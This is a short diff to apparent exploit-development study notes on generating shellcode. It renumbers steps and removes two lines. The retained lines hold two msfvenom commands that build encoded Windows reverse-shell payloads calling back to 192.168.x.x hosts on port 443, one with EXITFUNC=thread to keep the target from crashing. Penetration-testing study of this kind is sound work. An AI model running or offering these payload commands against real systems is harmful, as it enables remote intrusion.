@@ -23,11 +23,8 @@
 7. Generating shellcode
     1. Basic encoded:
          1. `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.181 LPORT=443 -f python –e x86/shikata_ga_nai -b "\x00"`
-    3. Avoid crashing:
+    2. Avoid crashing:
          1. `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f python –e x86/shikata_ga_nai -b "\x00\x0a"`
-9. Getting the shellcode
-10. Improving the exploit (not to crash the application)
-    1. If multi-threaded application, add to msf-venom `EXITFUNC=thread`
 
 ## Links
 
